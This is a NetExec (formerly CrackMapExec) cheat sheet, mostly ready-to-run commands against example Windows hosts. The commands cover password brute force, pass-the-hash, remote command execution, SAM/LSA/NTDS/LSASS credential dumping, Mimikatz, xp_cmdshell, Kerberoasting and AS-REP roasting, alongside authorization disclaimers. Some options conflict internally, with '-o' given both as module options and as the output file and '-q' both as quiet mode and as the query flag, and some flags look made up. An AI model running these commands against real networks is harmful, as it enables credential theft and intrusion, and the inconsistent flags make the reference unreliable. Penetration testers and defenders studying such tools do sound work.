# NetExec Cheat Sheet

## Overview

NetExec (formerly CrackMapExec or CME) is a post-exploitation tool used for:

- Automating assessment of large Active Directory networks.
- Enumerating users, shares, and sessions.
- Executing commands remotely.
- Dumping credentials (NTLM, hashes).
- Conducting authorized security assessments.

NetExec provides:

- SMB, WinRM, MSSQL, LDAP, and RDP protocols.
- Modular architecture for extensions.
- Parallel execution for speed.
- Credential reuse and pass-the-hash attacks.
- Integration with other pentesting tools.

```text
Use NetExec only against systems you own or are explicitly authorized to test.
```

---

# 1. Starting NetExec

## Basic syntax

```bash
nxc <protocol> <target> [options]
```

## Show help

```bash
nxc -h
```

## Show version

```bash
nxc --version
```

## Update NetExec

```bash
pipx upgrade netexec
```

Or from source:

```bash
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec
pipx install .
```

## Available protocols

```bash
nxc smb -h
nxc winrm -h
nxc mssql -h
nxc ldap -h
nxc rdp -h
nxc vnc -h
```

---

# 2. Target Specification

## Single target

```bash
nxc smb <target-ip>
```

Example:

```bash
nxc smb 192.168.1.10
```

## Multiple targets

```bash
nxc smb <target1> <target2> <target3>
```

Example:

```bash
nxc smb 192.168.1.10 192.168.1.11 192.168.1.12
```

## Target from file

```bash
nxc smb <file>
```

Example:

```bash
nxc smb targets.txt
```

## Target subnet

```bash
nxc smb <subnet>
```

Example:

```bash
nxc smb 192.168.1.0/24
```

## Target with port

```bash
nxc smb <target> --port <port>
```

Example:

```bash
nxc smb 192.168.1.10 --port 445
```

---

# 3. Authentication

## No authentication (null session)

```bash
nxc smb <target>
```

## Username and password

```bash
nxc smb <target> -u <username> -p <password>
```

Example:

```bash
nxc smb 192.168.1.10 -u admin -p password123
```

## Username list and password

```bash
nxc smb <target> -u <userfile> -p <password>
```

Example:

```bash
nxc smb 192.168.1.10 -u users.txt -p password123
```

## Username and password list

```bash
nxc smb <target> -u <userfile> -p <passfile>
```

Example:

```bash
nxc smb 192.168.1.10 -u users.txt -p passwords.txt
```

## NTLM hash

```bash
nxc smb <target> -u <username> -H <hash>
```

Example:

```bash
nxc smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash
```

## AES key

```bash
nxc smb <target> -u <username> -a <aes-key>
```

## Kerberos authentication

```bash
nxc smb <target> -u <username> -k
```

## Use cached credentials

```bash
nxc smb <target> --use-kcache
```

---

# 4. Enumeration

## Enumerate users

```bash
nxc smb <target> -u <username> -p <password> --users
```

Example:

```bash
nxc smb 192.168.1.10 -u admin -p password123 --users
```

## Enumerate groups

```bash
nxc smb <target> -u <username> -p <password> --groups
```

## Enumerate shares

```bash
nxc smb <target> -u <username> -p <password> --shares
```

Example:

```bash
nxc smb 192.168.1.10 -u admin -p password123 --shares
```

## Enumerate sessions

```bash
nxc smb <target> -u <username> -p <password> --sessions
```

## Enumerate disks

```bash
nxc smb <target> -u <username> -p <password> --disks
```

## Enumerate local admin users

```bash
nxc smb <target> -u <username> -p <password> --local-admins
```

## Enumerate logged-on users

```bash
nxc smb <target> -u <username> -p <password> --loggedon-users
```

## Enumerate RID cycling

```bash
nxc smb <target> -u <username> -p <password> --rid-brute
```

## Get domain information

```bash
nxc smb <target> -u <username> -p <password> --domain-info
```

## Get OS information

```bash
nxc smb <target> -u <username> -p <password> --os-info
```

---

# 5. Command Execution

## Execute command

```bash
nxc smb <target> -u <username> -p <password> -x <command>
```

Example:

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"
```

## Execute command with output

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method smbexec
```

## Execute PowerShell command

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method powershell
```

Example:

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "Get-Process" --exec-method powershell
```

## Execute command via WMI

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method wmi
```

## Execute command via MMC

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method mmcexec
```

## Execute command via atexec

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method atexec
```

## Execute PowerShell script

```bash
nxc smb <target> -u <username> -p <password> -x <script> --exec-method powershell
```

## Execute file

```bash
nxc smb <target> -u <username> -p <password> --exec-file <file>
```

---

# 6. Credential Dumping

## Dump SAM

```bash
nxc smb <target> -u <username> -p <password> --sam
```

## Dump LSA

```bash
nxc smb <target> -u <username> -p <password> --lsa
```

## Dump NTDS

```bash
nxc smb <target> -u <username> -p <password> --ntds
```

## Dump DPAPI

```bash
nxc smb <target> -u <username> -p <password> --dpapi
```

## Dump credentials

```bash
nxc smb <target> -u <username> -p <password> --dump
```

## Dump LSASS

```bash
nxc smb <target> -u <username> -p <password> --lsass
```

## Mimikatz

```bash
nxc smb <target> -u <username> -p <password> --mimikatz
```

## Nanodump

```bash
nxc smb <target> -u <username> -p <password> --nanodump
```

## Extract certificates

```bash
nxc smb <target> -u <username> -p <password> --certificates
```

---

# 7. Pass-the-Hash

## Pass-the-hash attack

```bash
nxc smb <target> -u <username> -H <hash>
```

Example:

```bash
nxc smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash
```

## Pass-the-hash with command

```bash
nxc smb <target> -u <username> -H <hash> -x <command>
```

## Overpass-the-hash

```bash
nxc smb <target> -u <username> -H <hash> --delegate <target>
```

## Silver ticket

```bash
nxc smb <target> -u <username> -H <hash> --silver-ticket <ticket>
```

## Golden ticket

```bash
nxc smb <target> -u <username> -H <hash> --golden-ticket <ticket>
```

---

# 8. Module Usage

## List available modules

```bash
nxc smb <target> -m
```

## Use specific module

```bash
nxc smb <target> -u <username> -p <password> -m <module>
```

Example:

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz
```

## Module with options

```bash
nxc smb <target> -u <username> -p <password> -m <module> -o <option>=<value>
```

Example:

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz -o COMMAND=ls
```

## Common modules

```bash
# Mimikatz
nxc smb <target> -u <username> -p <password> -m mimikatz

# Nanodump
nxc smb <target> -u <username> -p <password> -m nanodump

# Empire
nxc smb <target> -u <username> -p <password> -m empire_exec

# Metasploit
nxc smb <target> -u <username> -p <password> -m met_inject

# RDP
nxc smb <target> -u <username> -p <password> -m rdp

# VNC
nxc smb <target> -u <username> -p <password> -m vnc

# GPP
nxc smb <target> -u <username> -p <password> -m gpp_autologin

# Bloodhound
nxc smb <target> -u <username> -p <password> -m bloodhound
```

---

# 9. WinRM Protocol

## Basic WinRM scan

```bash
nxc winrm <target> -u <username> -p <password>
```

Example:

```bash
nxc winrm 192.168.1.10 -u admin -p password123
```

## Execute command via WinRM

```bash
nxc winrm <target> -u <username> -p <password> -x <command>
```

## Upload file via WinRM

```bash
nxc winrm <target> -u <username> -p <password> --put-file <local> <remote>
```

## Download file via WinRM

```bash
nxc winrm <target> -u <username> -p <password> --get-file <remote> <local>
```

## WinRM with hash

```bash
nxc winrm <target> -u <username> -H <hash>
```

---

# 10. MSSQL Protocol

## Basic MSSQL scan

```bash
nxc mssql <target> -u <username> -p <password>
```

## Execute query

```bash
nxc mssql <target> -u <username> -p <password> -q <query>
```

Example:

```bash
nxc mssql 192.168.1.10 -u sa -p password123 -q "SELECT @@version"
```

## Enable xp_cmdshell

```bash
nxc mssql <target> -u <username> -p <password> --enable-xp-cmdshell
```

## Execute command via xp_cmdshell

```bash
nxc mssql <target> -u <username> -p <password> -x <command>
```

## Dump hashes

```bash
nxc mssql <target> -u <username> -p <password> --dump-hashes
```

---

# 11. LDAP Protocol

## Basic LDAP scan

```bash
nxc ldap <target> -u <username> -p <password>
```

## Enumerate users

```bash
nxc ldap <target> -u <username> -p <password> --users
```

## Enumerate groups

```bash
nxc ldap <target> -u <username> -p <password> --groups
```

## Enumerate computers

```bash
nxc ldap <target> -u <username> -p <password> --computers
```

## Enumerate DCs

```bash
nxc ldap <target> -u <username> -p <password> --dc-list
```

## AS-REP roasting

```bash
nxc ldap <target> -u <username> -p <password> --asreproast
```

## Kerberoasting

```bash
nxc ldap <target> -u <username> -p <password> --kerberoasting
```

## Bloodhound collection

```bash
nxc ldap <target> -u <username> -p <password> --bloodhound
```

## LDAP with hash

```bash
nxc ldap <target> -u <username> -H <hash>
```

---

# 12. Output Options

## Save output to file

```bash
nxc smb <target> -u <username> -p <password> -o <output-file>
```

## Verbose output

```bash
nxc smb <target> -u <username> -p <password> -v
```

## Debug output

```bash
nxc smb <target> -u <username> -p <password> -d
```

## Quiet mode

```bash
nxc smb <target> -u <username> -p <password> -q
```

## Show only successful results

```bash
nxc smb <target> -u <username> -p <password> --show-success
```

## Show only failed results

```bash
nxc smb <target> -u <username> -p <password> --show-fail
```

## Export credentials

```bash
nxc smb <target> -u <username> -p <password> --export-creds <file>
```

---

# 13. Common Attack Scenarios

## Basic enumeration

```bash
nxc smb 192.168.1.10 -u admin -p password123
```

## Enumerate shares

```bash
nxc smb 192.168.1.10 -u admin -p password123 --shares
```

## Execute command

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"
```

## Pass-the-hash

```bash
nxc smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash
```

## Dump credentials

```bash
nxc smb 192.168.1.10 -u admin -p password123 --dump
```

## Mimikatz

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz
```

## Brute-force

```bash
nxc smb 192.168.1.10 -u users.txt -p passwords.txt
```

## Kerberoasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting
```

## AS-REP roasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --asreproast
```

## Bloodhound

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound
```

---

# 14. Practical Workflows

## Basic AD enumeration workflow

```text
1. Identify domain controllers.
2. Enumerate users and groups.
3. Check for password policies.
4. Enumerate shares and sessions.
5. Look for credential reuse.
6. Document findings.
```

## Example: Full enumeration

```bash
# Basic scan
nxc smb 192.168.1.10 -u admin -p password123

# Enumerate users
nxc smb 192.168.1.10 -u admin -p password123 --users

# Enumerate shares
nxc smb 192.168.1.10 -u admin -p password123 --shares

# Execute command
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"

# Dump credentials
nxc smb 192.168.1.10 -u admin -p password123 --dump
```

## Example: Pass-the-hash

```bash
# PTH attack
nxc smb 192.168.1.10 -u admin -H hash

# Execute command with PTH
nxc smb 192.168.1.10 -u admin -H hash -x "whoami"
```

## Example: Kerberoasting

```bash
# Kerberoast
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting

# Save to file
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting > kerberoast.txt
```

## Example: Bloodhound

```bash
# Collect Bloodhound data
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound

# With specific collector
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound --collection all
```

---

# 15. Common Commands Reference

| Command | Description |
|---|---|
| `nxc smb <target>` | SMB scan |
| `nxc winrm <target>` | WinRM scan |
| `nxc mssql <target>` | MSSQL scan |
| `nxc ldap <target>` | LDAP scan |
| `nxc -u <user> -p <pass>` | Authenticate |
| `nxc -u <user> -H <hash>` | Pass-the-hash |
| `nxc --users` | Enumerate users |
| `nxc --groups` | Enumerate groups |
| `nxc --shares` | Enumerate shares |
| `nxc --sessions` | Enumerate sessions |
| `nxc -x <command>` | Execute command |
| `nxc --dump` | Dump credentials |
| `nxc --sam` | Dump SAM |
| `nxc --lsa` | Dump LSA |
| `nxc --ntds` | Dump NTDS |
| `nxc -m <module>` | Use module |
| `nxc --mimikatz` | Run Mimikatz |
| `nxc --kerberoasting` | Kerberoast |
| `nxc --asreproast` | AS-REP roast |
| `nxc --bloodhound` | Bloodhound collection |

---

# 16. Troubleshooting

## Connection refused

- Check if target is reachable.
- Verify port is open (445, 5985, 1433, 389).
- Check firewall rules.
- Ensure service is running.

## Access denied

- Verify credentials are correct.
- Check user permissions.
- Try different authentication method.
- Use pass-the-hash if available.

## Command execution failed

- Try different exec-method.
- Check if command is allowed.
- Verify user has execution rights.
- Use alternative protocol.

## Module not found

- Update NetExec.
- Check module name is correct.
- Verify module is installed.
- List available modules with `-m`.

## Slow performance

- Reduce concurrent threads.
- Check network latency.
- Use specific protocols.
- Limit target scope.

---

# 17. Security Best Practices

## Always verify findings

- Test credentials manually.
- Verify command execution.
- Cross-reference with other tools.
- Document all findings.

## Respect legal boundaries

- Only test systems you own.
- Obtain explicit authorization.
- Follow responsible disclosure.
- Document all activities.

## Minimize impact

- Use appropriate enumeration.
- Avoid aggressive scanning.
- Test during maintenance windows.
- Monitor target systems.

## Keep tools updated

- Update NetExec regularly.
- Stay informed about new modules.
- Follow security advisories.
- Test in controlled environments.

## Document everything

- Record all commands used.
- Note credentials found.
- Track enumeration results.
- Document findings and methods.

---

# 18. Important Reminders

- Always obtain explicit authorization before using NetExec.
- Test in a controlled lab environment first.
- Some modules may trigger security alerts.
- Respect network boundaries and policies.
- Keep NetExec updated regularly.
- Validate findings manually.
- Document all actions and commands.
- Preserve original evidence and logs.
- Understand the legal and ethical implications.
- Clean up after testing.

---

# 19. Quick Reference Examples

## Basic SMB scan

```bash
nxc smb 192.168.1.10 -u admin -p password123
```

## Enumerate shares

```bash
nxc smb 192.168.1.10 -u admin -p password123 --shares
```

## Execute command

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"
```

## Pass-the-hash

```bash
nxc smb 192.168.1.10 -u admin -H hash
```

## Dump credentials

```bash
nxc smb 192.168.1.10 -u admin -p password123 --dump
```

## Mimikatz

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz
```

## Kerberoasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting
```

## AS-REP roasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --asreproast
```

## Bloodhound

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound
```

## WinRM execution

```bash
nxc winrm 192.168.1.10 -u admin -p password123 -x "whoami"
```

---

# 20. Additional Resources

## NetExec Official

```text
https://github.com/Pennyw0rth/NetExec
```

## NetExec Documentation

```text
https://www.netexec.wiki/
```

## CrackMapExec Legacy

```text
https://github.com/byt3bl33d3r/CrackMapExec
```

## Active Directory Security

```text
https://www.ired.team/
```

## Bloodhound

```text
https://github.com/BloodHoundAD/BloodHound
```
